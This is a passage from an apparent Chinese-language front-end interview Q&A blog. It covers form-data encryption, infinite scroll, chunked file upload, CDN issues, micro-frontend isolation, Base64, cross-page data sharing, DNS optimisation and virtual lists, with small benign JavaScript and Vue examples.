在服务器上对接收到的表单数据进行加密和解密是一种常见的方式。服务器负责处理敏感数据的加密和解密，并将数据存储在加密的状态下。</p></li><li><p><strong>加密算法：</strong> 选择合适的加密算法是关键。常见的加密算法包括AES（高级加密标准）、RSA（非对称加密）、SHA（安全哈希算法）等。选择算法应基于安全需求和性能要求。</p></li><li><p><strong>密钥管理：</strong> 管理加密密钥也非常重要。密钥应该定期轮换，并且只有授权的用户或服务能够访问密钥。</p></li><li><p><strong>数据完整性：</strong> 除了加密外，还应考虑数据的完整性。可以使用哈希函数来验证数据在传输过程中是否被篡改。</p></li></ol><p>请注意，加密和解密是复杂的过程，需要谨慎处理。为了确保数据的安全性，建议咨询安全专家并遵循最佳实践。此外，了解法律法规（例如GDPR）和行业标准也对处理敏感数据至关重要。最终，安全性应该成为整个应用程序设计和开发的核心原则。</p><h3 id="4、上拉加载原理"><a href="#4、上拉加载原理" class="headerlink" title="4、上拉加载原理"></a>4、上拉加载原理</h3><p>上拉加载（Infinite Scroll）是一种在Web页面上实现动态加载内容的技术，通常用于处理大量数据或分页显示内容。其原理涉及到滚动事件和异步加载数据。以下是上拉加载的基本原理：</p><ol><li><p><strong>检测滚动事件：</strong> 上拉加载的第一步是检测用户是否已经滚动到页面底部。这通常通过监听滚动事件来实现。当用户滚动页面时，会触发滚动事件。</p></li><li><p><strong>计算滚动位置：</strong> 在滚动事件处理程序中，通过计算页面的滚动位置来确定用户是否已经接近页面底部。这可以使用JavaScript中的 <code>scrollTop</code> 和 <code>scrollHeight</code> 属性来完成。<code>scrollTop</code> 表示当前滚动的距离，<code>scrollHeight</code> 表示整个页面的高度。</p></li><li><p><strong>触发加载：</strong> 一旦滚动位置接近页面底部（例如，当 <code>scrollTop + 视口高度 &gt;= scrollHeight - 阈值</code> 时），触发异步加载数据的操作。阈值可以是一个预定义的像素值或百分比，用于确定何时触发加载。</p></li><li><p><strong>异步加载数据：</strong> 加载数据通常涉及向服务器发送请求，以获取更多内容。这可以使用AJAX、Fetch API、GraphQL或其他网络请求工具来完成。一旦数据加载完成，将其添加到页面上，以显示新的内容。</p></li><li><p><strong>更新滚动位置：</strong> 在加载新数据后，页面的高度可能会增加。因此，需要更新滚动位置的计算，以便在用户继续向下滚动时能够正确触发下一次加载。</p></li><li><p><strong>循环加载：</strong> 上述步骤将不断重复，用户可以持续滚动以加载更多数据，直到所有数据都被加载或达到某个限制条件。</p></li></ol><p>上拉加载的实现可以根据具体的应用和框架有所不同，但其核心原理是检测滚动事件，计算滚动位置，触发加载数据，然后更新滚动位置和显示新数据。这种技术有助于改善页面性能和用户体验，因为它允许在用户滚动时动态加载内容，而不需要一次性加载所有数据。</p><h3 id="5、大文件分片上传"><a href="#5、大文件分片上传" class="headerlink" title="5、大文件分片上传"></a>5、大文件分片上传</h3><p>大文件分片上传是一种将大文件拆分成多个小块（分片），然后逐个上传这些分片的方法。这种方法有助于提高文件上传的可靠性和效率，因为它允许在网络不稳定或上传中断的情况下，只需重新上传丢失或损坏的分片，而不需要重新上传整个大文件。以下是实现大文件分片上传的一般步骤：</p><ol><li><p><strong>分片：</strong> 将大文件分成固定大小的块（分片）。通常，每个分片的大小在1MB到10MB之间，这个大小可以根据需求进行调整。您可以使用工具或库来完成这个任务。</p></li><li><p><strong>上传分片：</strong> 逐个上传分片。可以使用常见的文件上传技术（如AJAX、Fetch API、axios等）来上传每个分片。服务器端需要接受并存储这些分片。</p></li><li><p><strong>管理分片：</strong> 在服务器端，您需要管理已经上传的分片，通常将它们存储在临时目录中。服务器还需要维护一个列表或数据库，用于跟踪哪些分片已经上传，哪些分片还需要上传。</p></li><li><p><strong>校验：</strong> 每次上传分片后，都需要对其进行校验，以确保分片的完整性。可以使用哈希算法（如MD5或SHA-256）计算分片的哈希值，并将其与客户端计算的哈希值进行比较，以验证分片的完整性。</p></li><li><p><strong>合并分片：</strong> 当所有分片都上传完毕并通过校验后，服务器端需要将这些分片合并成完整的文件。这可以通过将分片按照顺序连接起来来完成。</p></li><li><p><strong>清理：</strong> 最后，一旦大文件已经合并完成，可以删除服务器上的分片，释放存储空间。</p></li></ol><p>在实际应用中，您可能还需要考虑一些额外的因素，如断点续传（使用户能够在上传中断后恢复上传）、安全性（确保只有授权用户可以上传文件）、进度显示（向用户显示上传进度）等。</p><p>有许多库和框架可以帮助您实现大文件分片上传，例如：</p><ul><li><strong>Resumable.js：</strong> 一个用于实现断点续传和大文件上传的JavaScript库。</li><li><strong>Dropzone.js：</strong> 一个用于文件上传的库，可以轻松实现分片上传。</li><li><strong>Uppy：</strong> 一个现代的文件上传器，支持分片上传和断点续传。</li></ul><p>请根据您的项目需求和技术栈选择合适的工具和库来实现大文件分片上传。</p><h3 id="6、使用cdn是否有图片没来得及加载的情况，如何解决"><a href="#6、使用cdn是否有图片没来得及加载的情况，如何解决" class="headerlink" title="6、使用cdn是否有图片没来得及加载的情况，如何解决"></a>6、使用cdn是否有图片没来得及加载的情况，如何解决</h3><p>使用CDN（内容分发网络）通常可以提高静态资源（如图像、CSS、JavaScript等）的加载速度，因为CDN服务器通常分布在全球各地，能够更快地将资源提供给用户。但在某些情况下，由于网络问题或CDN配置问题，可能会出现图片未能及时加载的情况。以下是一些可能导致此问题的原因以及如何解决它们的方法：</p><ol><li><p><strong>CDN边缘节点问题：</strong> CDN提供商通常在全球各地拥有多个边缘节点，但某些节点可能会出现故障或延迟。这可能导致用户无法从离他们最近的节点加载资源。</p><p><strong>解决方法：</strong> 您可以尝试切换到不同的CDN提供商或与您的CDN提供商联系以报告问题。另外，选择一家可靠的全球CDN提供商通常可以降低这种情况的发生概率。</p></li><li><p><strong>DNS解析问题：</strong> 如果DNS解析速度较慢，可能会导致延迟加载。这是因为浏览器需要将域名解析为IP地址，然后才能请求资源。</p><p><strong>解决方法：</strong> 使用较快的DNS服务，或者使用DNS预取（DNS Prefetching）技术，将域名与资源关联起来，以加速DNS解析过程。</p></li><li><p><strong>资源大小问题：</strong> 如果图像文件太大，可能会导致加载时间过长，尤其是在慢速网络上。</p><p><strong>解决方法：</strong> 优化图像，减小文件大小，选择适当的图像格式，并使用图像压缩工具。还可以考虑使用图像的响应式版本，根据设备和屏幕尺寸提供适当大小的图像。</p></li><li><p><strong>CDN缓存问题：</strong> CDN通常会缓存静态资源以提高性能，但在某些情况下，缓存可能会导致旧版本的资源被提供给用户。</p><p><strong>解决方法：</strong> 在资源的URL中使用版本号或哈希值，以确保在更新资源时浏览器获取新版本。还可以配置CDN以减小缓存时间，以便更频繁地获取新资源。</p></li><li><p><strong>CDN就近路由问题：</strong> CDN可能会将用户路由到距离较远的边缘节点，而不是最近的节点，这可能会导致延迟加载。</p><p><strong>解决方法：</strong> 使用任播（Anycast）CDN，这种CDN会将用户路由到最近的边缘节点，以减少延迟。</p></li><li><p><strong>网络问题：</strong> 用户的网络连接可能会受到各种问题的影响，如网络拥塞、丢包等，这可能会导致资源加载失败或延迟。</p><p><strong>解决方法：</strong> 在这种情况下，很难在前端代码中解决问题。最好的做法是监控网络问题并与网络服务提供商联系。</p></li></ol><p>总之，使用CDN通常能够提高性能，但由于各种原因可能会导致图片未能及时加载。为了减少这种情况的发生，建议选择可靠的CDN提供商，优化资源大小，配置合适的缓存策略，并考虑与网络服务提供商合作以解决网络问题。</p><h3 id="7、视图层如何更改数据层"><a href="#7、视图层如何更改数据层" class="headerlink" title="7、视图层如何更改数据层"></a>7、视图层如何更改数据层</h3><p>在前端应用中，视图层如何更改数据层通常通过以下方式来实现：</p><ol><li><p><strong>用户交互事件：</strong> 用户在界面上的操作（如点击按钮、输入表单、拖拽元素等）会触发事件。这些事件通常与相应的事件处理函数关联，事件处理函数可以执行数据层的更改操作。</p><p>例如，通过点击按钮触发一个事件处理函数来改变数据：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// HTML</span><br>&lt;button id=<span class="hljs-string">&quot;changeDataButton&quot;</span>&gt;<span class="hljs-title class_">Change</span> <span class="hljs-title class_">Data</span>&lt;/button&gt;<br><br><span class="hljs-comment">// JavaScript</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;changeDataButton&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 在事件处理函数中更改数据层</span><br>  dataLayer.<span class="hljs-property">someValue</span> = newValue;<br>&#125;);<br></code></pre></td></tr></table></figure></li><li><p><strong>异步请求：</strong> 前端应用通常需要与服务器进行数据交互，可以通过发起异步请求（如Ajax请求、Fetch API请求等）来获取或更改数据。一旦请求完成，可以更新数据层以反映新的数据。</p><p>例如，通过Fetch API获取数据并更新数据层：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>    <span class="hljs-comment">// 将新数据更新到数据层</span><br>    dataLayer.<span class="hljs-property">someData</span> = data;<br>  &#125;);<br></code></pre></td></tr></table></figure></li><li><p><strong>状态管理库：</strong> 在大型应用中，通常会使用状态管理库（如Vuex、Redux等）来管理应用的数据层。这些库提供了一种集中管理应用状态的方式，通过分发（dispatch）操作来更改状态，并在视图层中监听状态变化来更新界面。</p><p>例如，在Vue.js中使用Vuex来更改数据层：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 在组件中分发一个动作（action）来更改数据</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-title function_">dispatch</span>(<span class="hljs-string">&#x27;changeDataAction&#x27;</span>, newValue);<br><br><span class="hljs-comment">// 在组件中监听数据变化，以便更新视图</span><br><span class="hljs-attr">computed</span>: &#123;<br>  <span class="hljs-title function_">someData</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-property">state</span>.<span class="hljs-property">someData</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>双向数据绑定：</strong> 有些前端框架（如Vue.js）支持双向数据绑定，允许直接在视图层中更改数据，同时自动将更改反映到数据层。这样，当用户在输入框中输入文本时，数据层中的数据也会相应地更新。</p><p>例如，在Vue.js中使用双向数据绑定：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- HTML --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;dataLayer.someValue&quot;</span> /&gt;</span><br><br><span class="hljs-comment">&lt;!-- JavaScript --&gt;</span><br>new Vue(&#123;<br>  data: &#123;<br>    dataLayer: &#123;<br>      someValue: &#x27;&#x27;<br>    &#125;<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure></li></ol><p>总之，视图层如何更改数据层通常涉及用户交互事件、异步请求、状态管理库以及双向数据绑定等不同的方法。选择哪种方法取决于应用的需求和使用的前端框架或库。不过，无论哪种方式，保持数据和视图的一致性是前端开发的关键部分。</p><h3 id="8、微应用的场景"><a href="#8、微应用的场景" class="headerlink" title="8、微应用的场景"></a>8、微应用的场景</h3><p>微应用（Micro Frontends）是一种将前端单页面应用（SPA）或前端模块拆分成小块的架构模式，每个小块被称为一个微应用，它们可以独立开发、部署和维护。微应用的场景可以涵盖多个方面，以下是一些常见的微应用应用场景：</p><ol><li><p><strong>多团队协作开发：</strong> 微应用允许不同团队或开发者独立开发和维护各自的微应用，每个微应用可以使用不同的技术栈和框架。这有助于降低大型前端应用的复杂性，提高团队的独立性和效率。</p></li><li><p><strong>独立部署和升级：</strong> 微应用可以独立部署和升级，而不会影响其他微应用。这降低了部署和维护的风险，允许快速迭代和发布新功能。</p></li><li><p><strong>性能优化：</strong> 微应用可以按需加载，从而减少初始加载时间。每个微应用可以拥有自己的懒加载策略，只在需要时加载相关资源。这有助于提高应用的性能和用户体验。</p></li><li><p><strong>跨团队合作：</strong> 不同团队可以协作开发一个复杂的前端应用，每个团队负责一个或多个微应用，它们可以通过定义明确的接口和通信机制来集成和协同工作。</p></li><li><p><strong>独立运行和测试：</strong> 微应用可以在本地独立运行和测试，这有助于提高开发速度和质量。每个微应用可以拥有自己的测试套件和开发环境。</p></li><li><p><strong>模块化开发：</strong> 微应用可以更好地实现模块化开发，每个微应用可以表示一个独立的功能或业务模块。这有助于组织和管理复杂的前端代码。</p></li><li><p><strong>多框架兼容：</strong> 微应用架构允许不同微应用使用不同的前端框架或库，从而支持多种技术栈的混合使用。这允许团队根据项目需求选择最适合的工具。</p></li><li><p><strong>应用复用：</strong> 微应用可以在不同的应用中重用，从而提高开发效率。如果一个微应用在一个项目中已经被开发和测试，它可以轻松地在其他项目中引入和使用。</p></li></ol><p>总之，微应用架构适用于大型前端应用的复杂性和团队协作需求。它允许团队独立开发和维护各自的部分，并在整个应用中高效集成，从而提高了开发效率、可维护性和可扩展性。微应用的应用场景可以根据具体项目和组织需求而变化。</p><h5 id="微应用它的css-js-是如何做隔离的"><a href="#微应用它的css-js-是如何做隔离的" class="headerlink" title="微应用它的css js 是如何做隔离的"></a>微应用它的css js 是如何做隔离的</h5><p>微应用中的 CSS 和 JavaScript 隔离是确保不同微应用之间不会互相影响的重要部分。这种隔离通常通过以下方法来实现：</p><h5 id="CSS-隔离"><a href="#CSS-隔离" class="headerlink" title="CSS 隔离"></a>CSS 隔离</h5><ol><li><p><strong>命名空间（Namespace）：</strong> 每个微应用的 CSS 类名和选择器都应该具有独特的命名空间，以防止冲突。这可以通过为每个微应用的 CSS 类名添加前缀或命名空间来实现。</p></li><li><p><strong>CSS Modules 或 CSS-in-JS：</strong> 使用工具如 CSS Modules 或 CSS-in-JS 可以将 CSS 局部化，使其仅对当前微应用有效。这些工具可以为每个组件生成唯一的 CSS 类名，从而实现隔离。</p></li><li><p><strong>Shadow DOM：</strong> 如果使用 Web Components，每个组件的样式可以通过 Shadow DOM 进行封装，从而实现样式的隔离。Shadow DOM 会将组件内部的 CSS 作用域限制在组件内部，防止样式泄漏。</p></li></ol><h5 id="JavaScript-隔离"><a href="#JavaScript-隔离" class="headerlink" title="JavaScript 隔离"></a>JavaScript 隔离</h5><ol><li><p><strong>沙盒环境：</strong> 微应用可以在一个独立的 JavaScript 沙盒环境中运行，这意味着每个微应用的 JavaScript 代码都在自己的执行环境中运行，不会污染全局作用域。这可以通过使用 iframe 或 Web Workers 来实现。</p></li><li><p><strong>模块化加载：</strong> 使用模块化加载器（如 Webpack 或 SystemJS）可以确保每个微应用的 JavaScript 模块都是独立的，不会与其他微应用的模块发生冲突。这些工具还可以帮助管理依赖关系，防止冗余加载。</p></li><li><p><strong>消息通信：</strong> 微应用之间可以使用消息通信机制来进行通信，而不是直接共享变量或状态。这可以防止不同微应用之间的 JavaScript 冲突。</p></li></ol><p>总的来说，实现 CSS 和 JavaScript 隔离的方法包括使用命名空间、局部化的工具、Shadow DOM、沙盒环境、模块化加载器和消息通信。这些方法可以确保每个微应用在运行时都是相互隔离的，不会互相干扰。选择哪种方法取决于项目的具体需求和技术栈。</p><h3 id="9、把后端的接口类型自动的转成前端的类型，你大概会怎么去做？"><a href="#9、把后端的接口类型自动的转成前端的类型，你大概会怎么去做？" class="headerlink" title="9、把后端的接口类型自动的转成前端的类型，你大概会怎么去做？"></a>9、把后端的接口类型自动的转成前端的类型，你大概会怎么去做？</h3><p>将后端的接口类型自动转换成前端的类型通常涉及到数据格式的转换，以确保前后端之间的数据能够正确匹配。以下是一些可能的做法：</p><ol><li><p><strong>使用 TypeScript 或 Flow：</strong> 如果你的前端项目使用了 TypeScript 或 Flow 类型系统，你可以为后端接口定义对应的类型。这样，在接口调用时，类型检查工具可以帮助你检测数据类型不匹配的问题。</p></li><li><p><strong>自动生成类型定义：</strong> 使用工具（例如，swagger-codegen、OpenAPI Generator）自动生成前端所需的类型定义文件。这些工具可以根据后端的 API 规范生成前端的类型定义，包括接口、请求参数和响应数据的类型。</p></li><li><p><strong>手动定义适配器：</strong> 手动编写一个适配器函数或类，将后端返回的数据转换为前端所需的格式。这个适配器可以在前端接收到后端数据后进行转换。这种方法适用于后端返回的数据结构较为复杂或需要进行定制化处理的情况。</p></li><li><p><strong>使用响应拦截器：</strong> 如果你使用的是像 Axios 这样的 HTTP 客户端库，你可以使用响应拦截器来自动转换后端数据。在拦截器中，你可以检查后端响应的数据格式，并将其转换为前端所需的格式。</p></li><li><p><strong>使用自定义中间件：</strong> 如果你的前端应用使用了中间件（例如 Redux 中间件），你可以编写自定义中间件来处理后端数据的转换。这种方式允许你在数据进入前端应用之前进行转换。</p></li><li><p><strong>使用 GraphQL：</strong> 如果你的项目使用 GraphQL 作为前后端通信协议，GraphQL 查询语言本身具有强大的数据类型转换功能，前端可以明确请求所需的数据类型，后端会根据查询自动提供匹配的数据。</p></li><li><p><strong>数据校验和转换库：</strong> 使用数据校验和转换库，如 Yup、Joi 或 io-ts，来验证和转换接口数据。这些库可以帮助你定义数据的期望结构，并进行转换。</p></li></ol><p>具体选择哪种方法取决于项目的需求、技术栈以及开发团队的偏好。通常情况下，结合类型系统和自动生成工具可以提高前后端数据的匹配性，减少潜在的类型错误。同时，手动定义适配器或使用拦截器等方法也可以应对一些特殊情况。</p><h3 id="10、前端想要实现可视化图表展示有啥方式？"><a href="#10、前端想要实现可视化图表展示有啥方式？" class="headerlink" title="10、前端想要实现可视化图表展示有啥方式？"></a>10、前端想要实现可视化图表展示有啥方式？</h3><p>前端实现可视化图表展示有多种方式，具体选择哪种方式取决于项目的需求、技术栈和数据来源。以下是一些常见的前端可视化图表展示方式：</p><ol><li><p><strong>使用图表库：</strong> 最常见的方式是使用现有的图表库，这些库提供了各种类型的图表，如折线图、柱状图、饼图等，以及丰富的配置选项。一些流行的图表库包括：</p><ul><li><strong>Highcharts：</strong> Highcharts 是一个功能丰富且高度可定制的图表库，支持多种图表类型。</li><li><strong>Chart.js：</strong> Chart.js 是一个轻量级的图表库，适用于简单的图表需求。</li><li><strong>D3.js：</strong> D3.js 是一个强大的数据可视化库，提供了灵活的绘图工具和数据操作功能。</li></ul></li><li><p><strong>使用可视化工具：</strong> 有一些可视化工具允许你通过可视化界面来创建和定制图表，然后将生成的图表嵌入到前端应用中。一些可视化工具包括：</p><ul><li><strong>Tableau：</strong> Tableau 是一个强大的数据可视化工具，支持各种数据源和多种可视化选项。</li><li><strong>Google Charts：</strong> Google Charts 提供了一套易于使用的图表库，可以通过 JavaScript API 或配置选项进行定制。</li></ul></li><li><p><strong>使用前端框架和库：</strong> 许多前端框架和库提供了内置的图表组件或集成了流行的图表库，使图表的集成更加容易。例如，使用 React 可以使用库如 Recharts 或 Victory 来创建图表。</p></li><li><p><strong>自定义图表：</strong> 如果需要高度定制的图表，可以考虑自定义绘制图表。可以使用 HTML5 的 Canvas 或 SVG 来手动绘制图表，或者使用 D3.js 这样的工具库来帮助自定义绘制。</p></li><li><p><strong>数据可视化框架：</strong> 一些数据可视化框架（如 ECharts、Plotly、AmCharts）提供了现成的可视化组件，同时支持各种数据格式和交互特性。</p></li><li><p><strong>使用可视化组件库：</strong> 一些 UI 组件库（如 Ant Design、Element UI）提供了内置的图表组件，可以快速集成到项目中。</p></li><li><p><strong>数据可视化平台集成：</strong> 如果你的数据已经存储在数据可视化平台（如Power BI、Tableau、Looker）中，你可以考虑通过嵌入代码片段或API来将可视化报表集成到前端应用中。</p></li><li><p><strong>地图可视化：</strong> 如果需要展示地理信息数据，可以使用地图可视化库（如Leaflet、Mapbox、Google Maps API）来创建交互性地图。</p></li></ol><p>选择哪种方式取决于项目的要求和复杂性。对于简单的需求，使用现有的图表库可能是最快速和有效的方式。对于更复杂的需求，可能需要自定义绘制或集成更强大的可视化工具。无论如何，了解不同的可视化工具和库，以及它们的优缺点，可以帮助你做出明智的选择。</p><h3 id="11、图片为什么转为base64上传，能转为其他的吗，base64编码原理知道吗"><a href="#11、图片为什么转为base64上传，能转为其他的吗，base64编码原理知道吗" class="headerlink" title="11、图片为什么转为base64上传，能转为其他的吗，base64编码原理知道吗"></a>11、图片为什么转为base64上传，能转为其他的吗，base64编码原理知道吗</h3><p>将图片转为 Base64 格式上传的主要原因是将图片数据嵌入到文本中，以便通过文本传输，通常用于减少HTTP请求的数量、提高网页性能以及在某些情况下简化图片的处理和管理。Base64 编码是一种将二进制数据转换成文本数据的编码方式。</p><p>Base64 编码原理如下：</p><ol><li><p><strong>数据分块：</strong> 首先，将二进制数据分成固定大小的块（通常每 3 个字节为一块），如果数据的长度不是 3 的倍数，会在末尾填充 0。</p></li><li><p><strong>转换成十进制：</strong> 将每个块的二进制数据转换成十进制数值。</p></li><li><p><strong>Base64 编码：</strong> 将每个十进制数值转换成 Base64 字符。Base64 字符集包括 64 个字符，通常是 A-Z、a-z、0-9 和两个额外字符（通常是 ‘+’ 和 ‘&#x2F;‘）。</p></li><li><p><strong>填充字符：</strong> 如果原始数据长度不是 3 的倍数，会在末尾添加一个或两个 ‘&#x3D;’ 字符，以表示填充。</p></li></ol><p>由于 Base64 编码将二进制数据转换为文本数据，所以可以在文本协议中传输，例如在 HTML、CSS 或 JSON 中嵌入图片数据。这可以减少HTTP请求，特别是对于小图片而言，因为不需要单独请求图片文件。但需要注意的是，Base64 编码会增加数据大小约 1&#x2F;3，因为每 3 个字节的二进制数据编码成 4 个字符。</p><p>除了Base64，还有其他的方式来上传图片，例如：</p><ol><li><p><strong>直接上传二进制文件：</strong> 将图片作为二进制文件上传到服务器，不经过Base64编码。这是最常见的方式，适用于大型图片或需要后端进一步处理的情况。</p></li><li><p><strong>使用FormData：</strong> 使用 FormData 对象来上传二进制文件。这种方式可以在前端轻松构建包含文件上传的表单，并将文件以二进制形式传输到服务器。</p></li><li><p><strong>CDN上传：</strong> 使用内容分发网络（CDN）来存储和分发图片，然后通过URL引用图片。这是在前端开发中常见的做法，特别是对于大型图片或需要全球分发的情况。</p></li></ol><p>选择上传方式取决于具体需求和应用场景。Base64 编码适用于小图片或需要在文本协议中传输图片数据的情况，但对于大型图片或需要后端处理的情况，通常更适合使用其他方式上传图片。</p><h3 id="12、有哪些数据共享跨页面方案，如何实现共享的？window可以吗？"><a href="#12、有哪些数据共享跨页面方案，如何实现共享的？window可以吗？" class="headerlink" title="12、有哪些数据共享跨页面方案，如何实现共享的？window可以吗？"></a>12、有哪些数据共享跨页面方案，如何实现共享的？window可以吗？</h3><p>在前端中，有多种数据共享跨页面的方案，每种方案都有其适用的场景和实现方式。以下是一些常见的数据共享方案和它们的实现方式：</p><ol><li><p><strong>URL 参数：</strong> 可以通过 URL 参数将数据传递给不同的页面。这是一种简单的方式，适用于少量数据的共享。实现方式是在页面之间传递参数并解析 URL 中的参数。</p></li><li><p><strong>Cookies：</strong> 使用浏览器的 Cookie 来存储数据。Cookie 数据在同一域名下的不同页面之间共享。实现方式是设置 Cookie，并在不同页面中读取和更新 Cookie。</p></li><li><p><strong>LocalStorage 和 SessionStorage：</strong> 这两种 Web 存储方案可以用于在不同页面之间共享数据。它们分别具有长期和会话级别的数据存储能力。实现方式是使用 <code>localStorage</code> 或 <code>sessionStorage</code> API 存储和检索数据。</p></li><li><p><strong>IndexedDB：</strong> IndexedDB 是一个客户端数据库，可以用于存储大量结构化数据，并且可以在不同页面之间共享。实现方式是使用 IndexedDB API 执行数据库操作。</p></li><li><p><strong>Web Storage API：</strong> Web Storage API 是一个通用的 Web 存储方案，包括 LocalStorage 和 SessionStorage。可以使用 <code>localStorage</code> 或 <code>sessionStorage</code> 存储和共享数据。</p></li><li><p><strong>服务端存储：</strong> 如果需要在不同用户之间共享数据，可以将数据存储在服务端，并提供 API 供不同页面访问和更新数据。</p></li><li><p><strong>状态管理库：</strong> 使用状态管理库（如 Redux、Mobx、Vuex 等）可以在不同页面之间共享应用程序的状态。这些库通常将状态存储在一个全局的状态容器中，并提供了一种在不同组件和页面之间共享和同步状态的机制。</p></li><li><p><strong>WebSocket：</strong> WebSocket 可以用于实时数据共享，它允许不同页面建立实时通信连接，从而在页面之间传递数据。</p></li><li><p><strong>window 对象：</strong> 可以使用全局的 <code>window</code> 对象来存储和共享数据，但这种方式通常不是最佳实践，因为全局变量可能会导致命名冲突和安全风险。</p></li></ol><p>对于使用 <code>window</code> 对象来存储和共享数据，应该谨慎使用，避免全局变量的滥用，因为它可能导致不可预测的问题。更推荐使用上述其他方法中的一种，根据具体需求选择合适的方案。</p><h3 id="13、DNS解析如何提高效率"><a href="#13、DNS解析如何提高效率" class="headerlink" title="13、DNS解析如何提高效率"></a>13、DNS解析如何提高效率</h3><p>DNS（Domain Name System）解析是将域名转换为 IP 地址的过程，它在浏览器加载网页时起着关键作用。提高 DNS 解析的效率可以加速网页加载速度。以下是一些方法来提高 DNS 解析的效率：</p><ol><li><p><strong>使用快速的 DNS 服务器：</strong> 使用可靠且快速响应的 DNS 服务器，例如 Google Public DNS 或 Cloudflare DNS，可以减少 DNS 查询的响应时间。你可以在计算机或路由器设置中配置首选 DNS 服务器来切换到这些服务。</p></li><li><p><strong>DNS 缓存：</strong> 操作系统和浏览器通常会缓存 DNS 查询的结果，以便在将来的访问中重用。这可以减少对 DNS 服务器的频繁查询，提高性能。确保你的系统和浏览器开启了 DNS 缓存功能。</p></li><li><p><strong>DNS 预取：</strong> 现代浏览器通常会自动执行 DNS 预取，即在加载网页时提前解析页面中的链接，以便提高页面加载速度。确保你的网站配置正确，以允许浏览器执行 DNS 预取。</p></li><li><p><strong>减少域名解析次数：</strong> 网页中引用的域名越多，DNS 解析的次数就越多。尽量减少网页中的第三方资源或域名，以减少 DNS 查询的数量。</p></li><li><p><strong>DNS 查询并行：</strong> 现代浏览器通常支持并行执行多个 DNS 查询，以加速网页加载。确保你的浏览器设置中启用了 DNS 查询并行。</p></li><li><p><strong>DNS 负载均衡：</strong> 对于高流量网站，可以考虑将 DNS 查询分散到多个不同的 DNS 服务器上，以减轻单一 DNS 服务器的负载。</p></li><li><p><strong>TTL 调整：</strong> TTL（Time to Live）是 DNS 记录的生存时间，它指定了记录在缓存中的有效期。调整 TTL 设置可以控制 DNS 缓存的时效性，但需要权衡响应速度和缓存更新的频率。</p></li><li><p><strong>使用 CDN（内容分发网络）：</strong> CDN 提供分布式的缓存和加速服务，可以显著减少 DNS 解析的次数，同时提高网页加载速度。</p></li></ol><p>综合利用这些方法，可以加速 DNS 解析的速度，从而改善用户的网页加载体验。然而，需要注意的是，DNS 解析通常只占整个网页加载时间的一小部分，网站性能的提升还需要考虑其他因素，如网络延迟、服务器响应时间、资源加载等。</p><h3 id="14、虚拟列表"><a href="#14、虚拟列表" class="headerlink" title="14、虚拟列表"></a>14、虚拟列表</h3><p>虚拟列表（Virtual List）是一种优化技术，通常用于处理大型数据集的渲染问题，以提高前端应用程序的性能和用户体验。其基本原理是只渲染可见区域内的列表项，而不是将整个列表渲染到 DOM 中。这样可以减少 DOM 元素的数量，从而减少渲染和布局的开销，提高页面的响应速度。</p><p>以下是虚拟列表的基本原理：</p><ol><li><p><strong>确定可见区域</strong>：首先，需要确定可见区域的大小，通常是列表容器的高度。这个可见区域通常称为视口（Viewport）。</p></li><li><p><strong>计算列表项的高度</strong>：每个列表项的高度通常是固定的，但在某些情况下也可以是可变的。你需要知道每个列表项的高度，以便在渲染时进行定位。</p></li><li><p><strong>计算列表项的总高度</strong>：通过将每个列表项的高度相加，可以计算出整个列表的总高度。</p></li><li><p><strong>计算可见区域内的列表项</strong>：根据可见区域的高度和位置，计算出可见区域内应该渲染的列表项的数量。通常，这涉及到计算第一个可见项的索引和最后一个可见项的索引。</p></li><li><p><strong>只渲染可见区域内的列表项</strong>：只有可见区域内的列表项被渲染到 DOM 中，而不是将整个列表渲染出来。这可以通过设置元素的样式（例如 <code>overflow: hidden;</code>）来隐藏不可见的部分。</p></li><li><p><strong>监听滚动事件</strong>：为了实现滚动时动态加载和卸载列表项，需要监听滚动事件。当用户滚动列表时，计算哪些列表项需要进入视口，哪些需要离开视口，并相应地进行渲染和卸载。</p></li><li><p><strong>更新渲染的列表项</strong>：根据滚动位置和可见区域的变化，更新渲染的列表项，通常使用 JavaScript 来实现。</p></li></ol><p>虚拟列表的实现可以相对复杂，但它可以显著提高处理大型数据集的性能。这种技术通常与现代前端框架（如React、Vue）或列表组件库结合使用，这些框架和库通常提供了虚拟列表的实现。虚拟列表还可以与懒加载（Lazy 